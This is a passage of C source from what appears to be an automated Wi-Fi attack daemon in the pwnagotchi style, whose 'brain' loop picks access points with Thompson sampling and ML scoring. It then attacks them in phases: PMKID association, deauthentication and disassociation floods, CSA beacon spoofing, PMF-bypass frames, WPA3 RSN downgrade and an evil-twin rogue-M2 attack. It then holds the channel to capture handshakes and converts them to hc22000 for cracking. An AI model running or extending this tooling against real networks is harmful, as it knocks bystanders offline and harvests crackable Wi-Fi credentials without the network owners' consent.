            int attack_phase = ctx->epoch.epoch_num % 8; /* default fallback */
            brain_attack_tracker_t *ap_tracker = NULL; /* set per-target below */
            int did_deauth_this_ch = 0;
            int did_assoc_this_ch = 0;

            uint64_t _t_atk = cpu_act_start();
            for (int ci = 0; ci < candidate_count && ctx->running; ci++) {
                uint64_t _t_ts = cpu_act_start();
                ts_entity_t *target;
                if (ci == 0) {
                    /* T209: Use v3 combined scoring if available, else basic Thompson */
                    if (ctx->v3 && candidate_count > 0) {
                        /* Score all candidates with v3, pick the best */
                        float best_v3 = -1.0f;
                        target = candidates[0];
                        double _lat_v3 = 0.0, _lon_v3 = 0.0;
                        if (ctx->gps && ctx->gps->has_fix) {
                            _lat_v3 = ctx->gps->latitude;
                            _lon_v3 = ctx->gps->longitude;
                        }
                        for (int vi = 0; vi < candidate_count; vi++) {
                            int eidx = (int)(candidates[vi] - ctx->thompson->entities);
                            float sc = v3_score_entity(ctx->v3, ctx->thompson,
                                                       candidates[vi], eidx,
                                                       &TS_ACTION_ASSOCIATE,
                                                       _lat_v3, _lon_v3);
                            if (sc > best_v3) {
                                best_v3 = sc;
                                target = candidates[vi];
                            }
                        }
                    } else {
                        target = ts_decide_entity(ctx->thompson, candidates, candidate_count,
                                                  &TS_ACTION_ASSOCIATE);
                    }
                } else {
                    target = candidates[ci];
                }
                cpu_act_end(g_health_state, CPU_ACT_THOMPSON, _t_ts);
                if (!target) continue;
                if (ci > 0 && candidates[0] == target) continue;

                /* Find the bcap_ap_t for this entity */
                for (int i = 0; i < ap_count; i++) {
                    bcap_ap_t ap;
                    if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

                    char mac_str[BRAIN_MAC_STR_LEN];
                    mac_to_str(&ap.bssid, mac_str);
                    if (strcasecmp(mac_str, target->entity_id) != 0) continue;

                    /* Priority score: stronger signal + more clients = higher */
                    float priority = 1.0f / (1.0f + fabsf((float)ap.rssi + 50.0f) / 30.0f);
                    if (ap.clients_count > 0) priority *= (1.0f + 0.3f * ap.clients_count);

                    /* Per-AP cooldown: skip if attacked < 5s ago (AngryOxide timer_interact) */
                    time_t now_cd = time(NULL);
                    if (target->last_attacked > 0 &&
                        (now_cd - target->last_attacked) < 5 &&
                        attack_phase != 0 && attack_phase != 7) {
                        ts_observe_outcome(target, false, priority * 0.01f);
                        fprintf(stderr, "[brain] [cooldown] %s skip (attacked %lds ago)\n",
                                ap.ssid, (long)(now_cd - target->last_attacked));
                        break;
                    }

                    /* Record for deferred outcome */
                    strncpy(ctx->pending_attack_mac, mac_str, BRAIN_MAC_STR_LEN - 1);
                    ctx->pending_attack_time = time(NULL);
                    ctx->pending_robustness = priority;
                    target->last_attacked = now_cd; /* Update cooldown timer */

                    /* Per-AP attack phase via Thompson Sampling (#2) */
                    ap_tracker = get_attack_tracker(ctx, mac_str);
                    if (ap_tracker) {
                        bool is_wpa3 = (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE"));
                        ap_tracker->is_wpa3 = is_wpa3;
                        attack_phase = select_attack_phase(ap_tracker, is_wpa3, ctx->config.attack_phase_enabled);
                        ap_tracker->last_attack_phase = attack_phase;
                        /* Sprint 8: Record attack in AP database */
                        ap_db_record_attack(mac_str, attack_phase);
                        if (is_wpa3) {
                            fprintf(stderr, "[brain] [enc-route] %s is WPA3/SAE -> phase %d\n",
                                    ap.ssid, attack_phase);
                        }
                        /* Phase 5: ML attack phase prediction — boost Thompson choice */
                        {
                            time_t _mlt2 = time(NULL);
                            struct tm *_mltm2 = localtime(&_mlt2);
                            int _ml_hour2 = _mltm2 ? _mltm2->tm_hour : 12;
                            ap_features_ext_t _ml_ext;
                            memset(&_ml_ext, 0, sizeof(_ml_ext));
                            _ml_ext.base = make_ap_features(
                                ap.vendor, ap.encryption, ap.channel, ap.ssid,
                                ap.clients_count, ap.rssi, _ml_hour2);
                            float _ta = ap_tracker->atk_alpha[attack_phase];
                            float _tb = ap_tracker->atk_beta[attack_phase];
                            _ml_ext.thompson_ratio = (_ta + _tb > 0) ? _ta / (_ta + _tb) : 0.5f;
                            _ml_ext.has_pmkid = (get_handshake_quality(mac_str) == HS_QUALITY_PMKID) ? 1.0f : 0.0f;
                            _ml_ext.is_wpa3 = is_wpa3 ? 1.0f : 0.0f;
                            int _ml_phase = predict_attack_phase(&_ml_ext);
                            if (_ml_phase >= 0 && _ml_phase < BRAIN_NUM_ATTACK_PHASES &&
                                ctx->config.attack_phase_enabled[_ml_phase]) {
                                /* ML suggests different phase — blend: 70% Thompson, 30% ML */
                                if (_ml_phase != attack_phase) {
                                    /* Give ML phase a 50% boost in Thompson alpha */
                                    ap_tracker->atk_alpha[_ml_phase] += 0.5f;
                                }
                            }
                        }
                    }

                    /* Phase 1E: RSSI trend delay in walking mode — force PMKID at approach, full burst at peak */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ap_tracker) {
                        bool _has_any_hs = (get_handshake_quality(mac_str) != HS_QUALITY_NONE);
                        if (rssi_trend_should_delay(&ap_tracker->rssi_trend, _has_any_hs)) {
                            /* Approaching — only do PMKID association, save deauth for peak */
                            rssi_trend_info_t _rti;
                            rssi_trend_classify(&ap_tracker->rssi_trend, &_rti);
                            fprintf(stderr, "[brain] [rssi-delay] %s approaching (slope=%.1f rssi=%d) -> PMKID only\n",
                                    ap.ssid, _rti.slope, ap.rssi);
                            attack_phase = 0;  /* Force PMKID/association only */
                        } else {
                            /* Apply RSSI priority multiplier to Thompson scores */
                            float _rpri = rssi_trend_priority(&ap_tracker->rssi_trend);
                            if (_rpri > 1.2f) {
                                fprintf(stderr, "[brain] [rssi-peak] %s at peak (pri=%.1f) -> full burst\n",
                                        ap.ssid, _rpri);
                            }
                            priority *= _rpri;
                        }
                    }

                    /* Phase 2D: Walking mode — use walk_get_strategy() to influence attack type */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ctx->walking.active && ap_tracker) {
                        rssi_trend_info_t _wstrat_info;
                        rssi_trend_t _wtrend = rssi_trend_classify(&ap_tracker->rssi_trend, &_wstrat_info);
                        walk_attack_strategy_t _wstrat = walk_get_strategy(_wtrend);
                        switch (_wstrat) {
                            case WALK_ATTACK_PMKID_ONLY:
                                /* Approaching: PMKID only, save deauth for peak */
                                if (attack_phase != 0 && attack_phase != 7) {
                                    attack_phase = 0;
                                }
                                break;
                            case WALK_ATTACK_FULL_BURST:
                                /* At peak: use whatever Thompson selected — all weapons */
                                break;
                            case WALK_ATTACK_FINAL_SHOT:
                                /* Departing: one last deauth attempt */
                                if (attack_phase != 2 && ap.clients_count > 0) {
                                    attack_phase = 2;  /* Force targeted deauth */
                                }
                                break;
                        }
                    }

                    /* Phase 2C: Stationary mode — override attack phase with rotation system */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY && ctx->stationary.active) {
                        if (ctx->stationary.phase == STAT_PHASE_BURST ||
                            ctx->stationary.phase == STAT_PHASE_CIRCLE) {
                            stat_attack_type_t _sat = stat_get_attack_type(&ctx->stationary, mac_str);
                            /* Map stationary attack type to brain attack phase */
                            switch (_sat) {
                                case STAT_ATK_DEAUTH_BIDI:  attack_phase = 2; break;  /* Targeted deauth */
                                case STAT_ATK_CSA_BEACON:   attack_phase = 1; break;  /* CSA */
                                case STAT_ATK_PMKID_ASSOC:  attack_phase = 0; break;  /* PMKID */
                                case STAT_ATK_DEAUTH_BCAST: attack_phase = 2; break;  /* Deauth (broadcast variant) */
                                case STAT_ATK_DISASSOC:     attack_phase = 4; break;  /* Disassociation */
                                default: break;  /* Keep Thompson selection */
                            }
                            /* Only use phases that are globally enabled */
                            if (!ctx->config.attack_phase_enabled[attack_phase] && ap_tracker) {
                                attack_phase = select_attack_phase(ap_tracker, ap_tracker->is_wpa3,
                                                                   ctx->config.attack_phase_enabled);
                            }
                        }
                    }

                    /* === PHASE-BASED ATTACK === */
                    if (ctx->current_mode == MODE_PASSIVE_DISCOVERY) {
                        /* Passive mode: observe only, give small Thompson reward */
                        ts_observe_outcome(target, false, priority * 0.05f);
                        /* v3.0: Passive observation still sees the beacon */
                        if (ctx->v3) {
                            int eidx = (int)(target - ctx->thompson->entities);
                            v3_observe(ctx->v3, ctx->thompson, target, eidx,
                                       REWARD_BEACON, ctx->last_lat, ctx->last_lon);
                        }
                        break;
                    }


                /* Sprint 6 #14: Adapt TX power for this target */
                int _tx = adapt_tx_power(ctx, ap.rssi);
                set_tx_power(ctx, _tx);

                    /* Sprint 7 #18: Skip attack if phase globally disabled */
    if (!ctx->config.attack_phase_enabled[attack_phase]) {
        fprintf(stderr, "[brain] Phase %d disabled, skipping attack on %s\n", attack_phase, mac_str);
        continue;
    }

    switch (attack_phase) {
                    case 0: {
                        /* PMKID phase: associate with every AP */
                        brain_associate(ctx, &ap);
                        did_assoc_this_ch++;
                        ts_observe_outcome(target, false, priority * 0.1f);
                        fprintf(stderr, "[brain] [assoc] %s (%s) rssi=%d\n",
                                ap.ssid, mac_str, ap.rssi);
                        break;
                    }
                    case 1: {
                        /* CSA phase: trick clients into switching channel 14 (always invalid) */
                        /* AngryOxide approach: raw CSA beacon (6 frames, count 5->0) + action frame */
                        if (g_raw_sock >= 0) {
                            /* Raw CSA beacon injection (6 beacons with countdown) */
                            attack_csa_beacon(g_raw_sock, &ap);
                            /* Raw CSA action frame to broadcast */
                            attack_csa_action(g_raw_sock, &ap);
                        }
                        /* Also send bettercap CSA as fallback/complement */
                        if (ap.clients_count > 0) {
                            char csa_cmd[128];
                            snprintf(csa_cmd, sizeof(csa_cmd),
                                     "wifi.channel_switch_announce %s 14", mac_str);
                            bcap_send_command(ctx->bcap, csa_cmd);
                        } else {
                            /* No clients: do assoc instead (PMKID) */
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.1f);
                        break;
                    }
                    case 2: {
                        /* Deauth phase: targeted per-client deauth */
                        int sta_count = bcap_get_sta_count(ctx->bcap);
                        int deauthed = 0;
                        for (int s = 0; s < sta_count && deauthed < 5; s++) {
                            bcap_sta_t sta;
                            if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                            if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) == 0) {
                                /* Prefer raw bidi deauth (correct reason codes) over bettercap API */
                                if (g_raw_sock >= 0) {
                                    attack_deauth_bidi(g_raw_sock, &ap, &sta);
                                } else {
                                    brain_deauth(ctx, &ap, &sta);
                                }
                                deauthed++;
                            }
                        }
                        if (deauthed > 0) {
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, deauthed);
                            fprintf(stderr, "[brain] [deauth] %s: %d clients\n",
                                    ap.ssid, deauthed);
                        }
                        /* Broadcast deauth: hit ALL clients at once (AngryOxide-style) */
                        if (g_raw_sock >= 0) {
                            attack_deauth_broadcast(g_raw_sock, &ap);
                            ctx->epoch.any_activity = true;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                        }
                        if (deauthed == 0 && g_raw_sock < 0) {
                            /* No raw sock and no clients: fallback assoc */
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 3: {
                        /* PMF BYPASS PHASE: full MFP bypass battery
                         * - anon_reassoc: broadcast reassoc that forces AP-side signed deauth
                         * - eapol_m1_malformed: bad EAPOL M1 disrupts client key state (PMF can't protect EAPOL)
                         * - power_save_spoof: PS bit manipulation causes frame buffering disruption */
                        if (g_raw_sock >= 0) {
                            attack_anon_reassoc(g_raw_sock, &ap);
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                            ctx->epoch.any_activity = true;

                            /* RSN Downgrade for WPA3/SAE targets (#3) */
                            if (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE")) {
                                int ns_rsn = bcap_get_sta_count(ctx->bcap);
                                int rsn_hit = 0;
                                for (int s = 0; s < ns_rsn && rsn_hit < 3; s++) {
                                    bcap_sta_t sta_rsn;
                                    if (bcap_get_sta(ctx->bcap, s, &sta_rsn) != 0) continue;
                                    if (memcmp(sta_rsn.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                    attack_rsn_downgrade(g_raw_sock, &ap, &sta_rsn);
                                    rsn_hit++;
                                }
                            }

                            /* Additional PMF bypasses for WPA2/WPA3 targets with clients */
                            if (ap.clients_count > 0) {
                                int ns = bcap_get_sta_count(ctx->bcap);
                                int pmf_hit = 0;
                                for (int s = 0; s < ns && pmf_hit < 3; s++) {
                                    bcap_sta_t sta;
                                    if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                    if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                    /* Malformed EAPOL M1 — bypasses 802.11w */
                                    attack_eapol_m1_malformed(g_raw_sock, &ap, &sta);
                                    /* Power-save spoof — disrupts frame delivery */
                                    attack_power_save_spoof(g_raw_sock, &ap, &sta);
                                    pmf_hit++;
                                }
                            }
                        } else {
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 4: {
                        /* DISASSOC: bidirectional disassociation via raw injection */
                        int dis_count = 0;
                        if (g_raw_sock >= 0 && ap.clients_count > 0) {
                            int ns = bcap_get_sta_count(ctx->bcap);
                            for (int s = 0; s < ns && dis_count < 5; s++) {
                                bcap_sta_t sta;
                                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                if (!sta.associated) continue;
                                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                attack_disassoc_bidi(g_raw_sock, &ap, &sta);
                                dis_count++;
                            }
                        }
                        if (dis_count > 0) {
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                            fprintf(stderr, "[brain] [disassoc] %s: %d clients bidi\n",
                                    ap.ssid, dis_count);
                        } else {
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 5: {
                        /* ROGUE M2: Evil Twin attack - impersonate AP, send M1, capture M2 */
                        if (g_raw_sock >= 0 && ap.clients_count > 0) {
                            int ns = bcap_get_sta_count(ctx->bcap);
                            int rogue_count = 0;
                            for (int s = 0; s < ns && rogue_count < 3; s++) {
                                bcap_sta_t sta;
                                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                attack_rogue_m2(g_raw_sock, &ap, &sta);
                                rogue_count++;
                            }
                            if (rogue_count > 0) {
                                did_deauth_this_ch++;
                                brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                                ctx->epoch.any_activity = true;
                                fprintf(stderr, "[brain] [rogue-m2] %s: %d clients sprayed\n",
                                        ap.ssid, rogue_count);
                            }
                        } else if (g_raw_sock >= 0) {
                            /* No clients: send auth+assoc instead for PMKID */
                            attack_auth_assoc_pmkid(g_raw_sock, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.2f);
                        break;
                    }
                    case 6: {
                        /* PROBE: Raw probe requests - discover APs + reveal hidden SSIDs */
                        if (g_raw_sock >= 0) {
                            /* Undirected probe (discover all APs on channel) */
                            attack_probe_undirected(g_raw_sock);
                            /* Directed probe to each known AP (reveals hidden SSIDs) */
                            if (strlen(ap.ssid) > 0) {
                                attack_probe_directed(g_raw_sock, &ap);
                            }
                            ctx->epoch.any_activity = true;
                        }
                        ts_observe_outcome(target, false, priority * 0.05f);
                        break;
                    }
                    case 7: {
                        /* Passive listen: let handshakes complete undisturbed */
                        ts_observe_outcome(target, false, priority * 0.02f);
                        break;
                    }
                    }

                    /* v3.0: Feed attack outcome to all v3 subsystems.
                     * The EAPOL callback handles HANDSHAKE/VERIFIED rewards.
                     * Here we record the intermediate signals:
                     *   - AP seen on channel → BEACON
                     *   - Clients detected → CLIENTS
                     *   - Deauth sent (pre-capture) → CLIENTS (we know there are clients)
                     *   - Association only → BEACON (AP responded) */
                    if (ctx->v3) {
                        int eidx = (int)(target - ctx->thompson->entities);
                        v3_reward_level_t rlvl;
                        if (did_deauth_this_ch > 0 || ap.clients_count > 0) {
                            rlvl = REWARD_CLIENTS;
                        } else if (did_assoc_this_ch > 0) {
                            rlvl = REWARD_BEACON;
                        } else {
                            rlvl = REWARD_BEACON;  /* At minimum we saw the AP */
                        }
                        v3_observe(ctx->v3, ctx->thompson, target, eidx,
                                   rlvl, ctx->last_lat, ctx->last_lon);
                    }

                    /* AngryOxide insight: ALWAYS try PMKID (m1_retrieval)
                     * on unapproached APs regardless of attack phase.
                     * This dramatically improves PMKID collection rate. */
                    if (attack_phase != 0 && 
                        get_handshake_quality(mac_str) == HS_QUALITY_NONE &&
                        g_raw_sock >= 0 && did_assoc_this_ch == 0) {
                        attack_auth_assoc_pmkid(g_raw_sock, &ap);
                        did_assoc_this_ch = 1;
                        fprintf(stderr, "[brain] [pmkid-always] %s (bg on phase %d)\n",
                                ap.ssid, attack_phase);
                    }

                    /* Track deauth attempts for blacklisting.
                     * If we deauthed but haven't captured a handshake,
                     * the counter increments. After threshold, AP is skipped. */
                    if (did_deauth_this_ch > 0) {
                        brain_track_deauth(ctx, mac_str);
                    }

                    /* Phase 2B: Driving mode — record association for sweep tracking */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING &&
                        ctx->driving.active && did_assoc_this_ch > 0) {
                        drv_record_association(&ctx->driving, ap.channel,
                                              mac_str, (int8_t)ap.rssi);
                    }

                    /* Phase 2D: Walking mode — record attack with strategy */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING &&
                        ctx->walking.active &&
                        (did_deauth_this_ch > 0 || did_assoc_this_ch > 0)) {
                        walk_target_t *_wt2 = NULL;
                        /* Determine strategy from current trend */
                        walk_attack_strategy_t _ws = WALK_ATTACK_PMKID_ONLY;
                        if (ap_tracker) {
                            rssi_trend_info_t _wri2;
                            rssi_trend_t _wtr2 = rssi_trend_classify(&ap_tracker->rssi_trend, &_wri2);
                            _ws = walk_get_strategy(_wtr2);
                        }
                        walk_record_attack(&ctx->walking, mac_str, _ws);
                    }

                    /* Phase 2C: Stationary mode — record attack for rotation tracking */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY &&
                        ctx->stationary.active &&
                        (did_deauth_this_ch > 0 || did_assoc_this_ch > 0)) {
                        /* Map attack_phase back to stat_attack_type_t */
                        stat_attack_type_t _stype = STAT_ATK_PMKID_ASSOC;
                        switch (attack_phase) {
                            case 0: _stype = STAT_ATK_PMKID_ASSOC; break;
                            case 1: _stype = STAT_ATK_CSA_BEACON; break;
                            case 2: _stype = STAT_ATK_DEAUTH_BIDI; break;
                            case 3: _stype = STAT_ATK_DEAUTH_BIDI; break;  /* PMF bypass → deauth variant */
                            case 4: _stype = STAT_ATK_DISASSOC; break;
                            case 5: _stype = STAT_ATK_DEAUTH_BCAST; break; /* Rogue M2 */
                            default: break;
                        }
                        stat_record_attack(&ctx->stationary, mac_str, _stype, false);
                        /* Success is recorded later if handshake is captured */
                    }

                    break;  /* Found the AP, move to next candidate */
                }
            }

            cpu_act_end(g_health_state, CPU_ACT_ATTACK, _t_atk);
            
            /* brcmfmac stabilization: brief cooldown after raw injection
             * to let the firmware process sent frames before channel hop.
             * Prevents firmware crashes from back-to-back inject+hop. */
            if (did_deauth_this_ch > 0 || did_assoc_this_ch > 0) {
                usleep(100000);  /* 100ms firmware breathing room */
            }

            /* FIX: Attack Dwell — hold channel after deauth to capture handshake.
             *
             * ROOT CAUSE of poor handshake capture: after sending deauth frames,
             * we'd hop to the next channel within 200-500ms. But clients take
             * 1-5 seconds to reconnect. By the time the 4-way handshake starts,
             * we're already on a different channel and miss it entirely.
             *
             * Solution: After deauth/disassoc attacks, dwell on the channel for
             * 3-8 seconds (RSSI-proportional — stronger signal = longer dwell
             * because we're closer and more likely to capture the reconnect).
             * During the dwell, send a second burst of deauths at the midpoint
             * to catch clients that didn't disconnect on the first attempt.
             *
             * For PMKID-only attacks (no deauth), use shorter dwell since we're
             * just waiting for M1 response, not a full client reconnection cycle.
             *
             * This is the single biggest improvement for handshake capture rate. */
            if (did_deauth_this_ch > 0) {
                /* Deauth attack: need to wait for client reconnection
                 * Strong signal = closer = higher chance = longer dwell */
                int best_rssi_on_ch = -100;
                for (int ci2 = 0; ci2 < candidate_count; ci2++) {
                    if (candidates[ci2]->last_rssi > best_rssi_on_ch)
                        best_rssi_on_ch = candidates[ci2]->last_rssi;
                }
                /* Scale dwell: -30dBm → 8s, -60dBm → 5s, -80dBm → 3s */
                int attack_dwell_ms;
                if (best_rssi_on_ch >= -50) {
                    attack_dwell_ms = 8000;
                } else if (best_rssi_on_ch >= -65) {
                    attack_dwell_ms = 6000;
                } else if (best_rssi_on_ch >= -75) {
                    attack_dwell_ms = 4000;
                } else {
                    attack_dwell_ms = 3000;
                }

                /* Phase 2B: Driving mode uses shorter dwell (moving fast) */
                if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING &&
                    ctx->driving.active && drv_dwell_ms > 0) {
                    attack_dwell_ms = drv_dwell_ms;  /* Driving override */
                }

                fprintf(stderr, "[brain] [attack-dwell] ch%d: holding %dms for handshake (rssi=%d, deauths=%d)\n",
                        ch, attack_dwell_ms, best_rssi_on_ch, did_deauth_this_ch);

                /* Wait first half, then send a second deauth burst */
                usleep((attack_dwell_ms / 2) * 1000);

                /* Second deauth burst at midpoint — catches clients that
                 * didn't disconnect on the first attempt */
                if (g_raw_sock >= 0 && candidate_count > 0) {
                    for (int ci2 = 0; ci2 < candidate_count && ci2 < 2; ci2++) {
                        ts_entity_t *retarget = candidates[ci2];
                        for (int i = 0; i < ap_count; i++) {
                            bcap_ap_t ap2;
                            if (bcap_get_ap(ctx->bcap, i, &ap2) != 0) continue;
                            char mac2[BRAIN_MAC_STR_LEN];
                            mac_to_str(&ap2.bssid, mac2);
                            if (strcasecmp(mac2, retarget->entity_id) != 0) continue;
                            if (ap2.channel != ch) continue;
                            /* Broadcast deauth (second burst) */
                            attack_deauth_broadcast(g_raw_sock, &ap2);
                            break;
                        }
                    }
                    fprintf(stderr, "[brain] [attack-dwell] ch%d: second deauth burst sent\n", ch);
                }

                /* Wait remaining half for handshake capture */
                usleep((attack_dwell_ms - attack_dwell_ms / 2) * 1000);
            } else if (did_assoc_this_ch > 0) {
                /* PMKID-only: shorter dwell, just waiting for M1 response */
                int dwell_ms = channel_map_get_listen_ms(&ctx->channel_map, ch);
                if (dwell_ms <= 0) dwell_ms = ctx->config.hop_recon_time * 1000;
                /* Minimum 2s for PMKID — AP needs time to send M1 */
                if (dwell_ms < 2000) dwell_ms = 2000;
                /* Phase 2B: Driving mode override */
                if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING &&
                    ctx->driving.active && drv_dwell_ms > 0) {
                    dwell_ms = drv_dwell_ms;
                }
                fprintf(stderr, "[brain] waiting %dms before hop to ch %d (pmkid-dwell)\n",
                        dwell_ms, (c + 1 < num_channels) ?
                        channels[c + 1] : channels[0]);
                usleep(dwell_ms * 1000);
            }
        }
        
        /* ── Phase 2B: Driving mode sweep end + cycle tracking ────────── */
        if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING && ctx->driving.active) {
            drv_sweep_end(&ctx->driving);
            if (drv_check_cycle(&ctx->driving)) {
                /* New 10-second cycle — dump performance stats */
                drv_dump_stats(&ctx->driving);
            }
        }

        /* ── Phase 2D: Walking mode — learn secondary channels from Thompson ── */
        if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ctx->walking.active) {
            /* Feed channel bandit scores to walking mode's secondary channel learning */
            if (ctx->epoch.epoch_num % 10 == 0 && num_channels > 0) {
                uint8_t _wl_ch[BRAIN_MAX_CHANNELS];
                float _wl_scores[BRAIN_MAX_CHANNELS];
                int _wl_count = 0;
                for (int wi = 0; wi < num_channels && _wl_count < BRAIN_MAX_CHANNELS; wi++) {
                    int _wch = channels[wi];
                    _wl_ch[_wl_count] = (uint8_t)_wch;
                    /* Get Thompson success ratio for this channel */
                    if (_wch >= 1 && _wch <= CB_MAX_CHANNELS) {
                        float _wa = ctx->channel_bandit.channels[_wch].alpha;
                        float _wb = ctx->channel_bandit.channels[_wch].beta;
                        _wl_scores[_wl_count] = (_wa + _wb > 0) ? _wa / (_wa + _wb) : 0.0f;
                    } else {
                        _wl_scores[_wl_count] = 0.0f;
                    }
                    _wl_count++;
                }
                walk_learn_secondary_channels(&ctx->walking, _wl_ch, _wl_scores, _wl_count);
            }
        }

        /* If no activity this epoch, wait before next epoch */
        if (!ctx->epoch.any_activity) {
            int wait_secs = ctx->config.recon_time;
            /* Sprint 4 #9: When mobile, shorter waits (we'll see new APs soon) */
            if (ctx->mobility_score > 0.3f) {
                wait_secs = (int)(wait_secs * (1.0f - ctx->mobility_score * 0.6f));
                if (wait_secs < 3) wait_secs = 3;
                fprintf(stderr, "[brain] no activity, waiting %ds (mobile=%.2f)\n",
                        wait_secs, ctx->mobility_score);
            } else {
                fprintf(stderr, "[brain] no activity, waiting %ds\n", wait_secs);
            }
            sleep(wait_secs);
        }

        /* End of epoch */
        
        /* Check handshake outcome */
        {
            long hs_now = total_handshake_bytes();
            if (ctx->pending_attack_mac[0]) {
                if (hs_now > ctx->hs_bytes_before_epoch) {
                    /* SUCCESS! Handshake captured */
                    ts_entity_t *w = ts_get_or_create_entity(ctx->thompson, ctx->pending_attack_mac);
                    if (w) { 
                        ts_observe_outcome(w, true, ctx->pending_robustness);
                        
                        /* Also reward the channel bandit */
                        cb_observe(&ctx->channel_bandit, w->channel, true);
                        
                        /* And reward the mode bandit */
                        ts_observe_mode_outcome(ctx->thompson, ctx->current_mode, true);
                        ctx->mode_handshakes++;
                    }
                    /* AUDIT FIX: Set MOOD_PWNED on handshake capture */
                    brain_set_mood(ctx, MOOD_PWNED);

                    /* AUDIT FIX: Record capture in channel map */
                    if (w) channel_map_record_capture(&ctx->channel_map, w->channel);

                    /* Phase 2: Notify mode pipeline of capture */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING)
                        walk_record_capture(&ctx->walking, ctx->pending_attack_mac);
                    else if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY) {
                        stat_record_capture(&ctx->stationary);
                        /* Mark the attack that led to capture as successful */
                        brain_attack_tracker_t *_sat_trk = get_attack_tracker(ctx, ctx->pending_attack_mac);
                        if (_sat_trk && _sat_trk->last_attack_phase >= 0) {
                            stat_attack_type_t _stype_ok = STAT_ATK_PMKID_ASSOC;
                            switch (_sat_trk->last_attack_phase) {
                                case 0: _stype_ok = STAT_ATK_PMKID_ASSOC; break;
                                case 1: _stype_ok = STAT_ATK_CSA_BEACON; break;
                                case 2: _stype_ok = STAT_ATK_DEAUTH_BIDI; break;
                                case 4: _stype_ok = STAT_ATK_DISASSOC; break;
                                default: break;
                            }
                            stat_record_attack(&ctx->stationary, ctx->pending_attack_mac, _stype_ok, true);
                        }
                    } else if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING) {
                        /* Record PMKID capture on the channel we got it */
                        if (w) drv_record_pmkid(&ctx->driving, w->channel);
                    }

                    fprintf(stderr, "[brain] HANDSHAKE! %s rewarded (ch%d, mode=%s)\n", 
                            ctx->pending_attack_mac, 
                            w ? w->channel : 0,
                            ts_mode_name(ctx->current_mode));
                    
                    /* Clear from blacklist tracker — this AP yielded a handshake */
                    brain_track_handshake(ctx, ctx->pending_attack_mac);

                    /* Sprint 3 #6: Immediate hc22000 conversion of new capture */
                    {
                        const char *hs_dirs[] = {"/home/pi/handshakes", "/var/lib/pwnagotchi/handshakes"};
                        for (int hd = 0; hd < 2; hd++) {
                            if (access(hs_dirs[hd], R_OK) == 0) {
                                hc22000_convert_directory(hs_dirs[hd]);
                                break;
                            }
                        }
                    }

                    /* Sprint 8: Update AP DB with handshake info */
                    {
                        char _hs_hash[256] = {0};
                        char _bssid_nocolon[13] = {0};
                        int _j = 0;
                        for (int _k = 0; ctx->pending_attack_mac[_k] && _j < 12; _k++) {
                            if (ctx->pending_attack_mac[_k] != ':') _bssid_nocolon[_j++] = ctx->pending_attack_mac[_k];
                        }
                        DIR *_hdir = opendir("/home/pi/handshakes");
                        if (_hdir) {
                            struct dirent *_hent;
                            while ((_hent = readdir(_hdir)) != NULL) {
                                if (strstr(_hent->d_name, _bssid_nocolon) && strstr(_hent->d_name, ".22000")) {
                                    snprintf(_hs_hash, sizeof(_hs_hash), "/home/pi/handshakes/%s", _hent->d_name);
                                    break;
                                }
                            }
                            closedir(_hdir);
                        }
                        ap_db_set_handshake(ctx->pending_attack_mac, true, 80, _hs_hash);
                    }

                    /* Reward the attack-type bandit (#2) */
                    {
                        brain_attack_tracker_t *hs_tracker = get_attack_tracker(ctx, ctx->pending_attack_mac);
                        if (hs_tracker && hs_tracker->last_attack_phase >= 0) {
                            observe_attack_outcome(hs_tracker, hs_tracker->last_attack_phase, true);
                            fprintf(stderr, "[brain] [atk-bandit] %s: phase %d REWARDED (handshake!)\n",
                                    ctx->pending_attack_mac, hs_tracker->last_attack_phase);
                        }
                    }

                    /* Fire handshake callback for UI notification */
                    if (ctx->on_handshake) {
                        bcap_handshake_t hs_evt = {0};
                        unsigned int m[6];
                        if (sscanf(ctx->pending_attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                                   &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                            for (int i = 0; i < 6; i++)
                                hs_evt.ap_bssid.addr[i] = (uint8_t)m[i];
                        }
                        hs_evt.captured_at = time(NULL);
